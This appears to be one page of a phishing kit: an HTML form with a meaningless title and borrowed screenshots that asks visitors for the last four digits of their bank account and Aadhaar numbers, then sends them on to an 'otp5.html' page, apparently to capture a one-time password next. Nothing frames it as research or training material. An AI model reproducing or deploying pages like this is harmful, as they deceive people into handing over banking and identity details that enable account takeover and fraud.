<!DOCTYPE html>
<html lang="en">
<head>
  <title>dehijlbrd</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #FFFFFF;
      width: 98%;
      overflow-x: hidden;
    }

    img {
      width: 100%;
      max-width: 1000px;
      border-radius: 0px;
      margin-top: 10px;
    }

    .form-container {
      width: 90%;
      max-width: 400px;
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 0px rgba(0,0,0,0.1);
      margin: 0 auto;
    }

    .form-group {
      margin-bottom: 15px;
      text-align: left;
      position: relative;
    }

    label {
      font-weight: bold;
      display: block;
      margin-bottom: 5px;
      color: #030303c0;
      font-size: 13px;
    }

    input[type="text"] {
      width: 96%;
      padding: 10px;
      background-color: #e5e5e5fa;
      border: 1px solid #aeaeae;
      border-radius: 0px;
      font-size: 12px;
      color: #333;
    }

    .error-message {
      color: red;
      font-size: 11px;
      margin-top: 5px;
      display: none;
    }

    .submit-btn {
      margin-top: 20px;
      text-align: center;
    }

    .submit-btn a {
      background: #f09c19;
      color: #fff;
      font-size: 12px;
      font-weight: bold;
      padding: 8px 18px;
      text-align: center;
      border-radius: 6px;
      text-decoration: none;
      display: inline-block;
      transition: background 0.3s ease;
    }

    .submit-btn a:hover {
      background: #0f3f55;
    }

    .bottom-image {
      width: 105%;
      max-width: 2000px;
      border-radius: 0px;
      margin-top: 20px;
      display: block;
    }
  </style>
</head>
<body>

  <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Meri Tasveer">

  <div class="form-container">
    <form onsubmit="return validateForm()">
      <div class="form-group">
        <label for="accLast4">Last 4 Digits of Account Number *</label>
        <input type="text" id="accLast4" name="accLast4" maxlength="4" pattern="\d{4}" required>
      </div>

      <div class="form-group">
        <label for="aadhaarLast4">Last 4 Digits of Aadhaar Number *</label>
        <input type="text" id="aadhaarLast4" name="aadhaarLast4" maxlength="4" required>
        <div class="error-message" id="aadhaarError">Enter exactly 4 digits.</div>
      </div>

      <div class="submit-btn">
        <a href="#" onclick="submitIfValid()">Submit</a>
      </div>
    </form>

    <img class="bottom-image" src="https://i.ibb.co/q3n4tF60/Screenshot-2025-04-20-09-17-33-68-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
  </div>

  <script>
    const aadhaarInput = document.getElementById("aadhaarLast4");
    const aadhaarError = document.getElementById("aadhaarError");

    aadhaarInput.addEventListener("input", () => {
      aadhaarError.style.display = "none";
    });

    function validateForm() {
      const aadhaar = aadhaarInput.value.trim();
      return /^\d{4}$/.test(aadhaar);
    }

    function submitIfValid() {
      if (validateForm()) {
        window.location.href = "otp5.html";
      } else {
        aadhaarError.style.display = "block";
      }
    }
  </script>
</body>
</html>
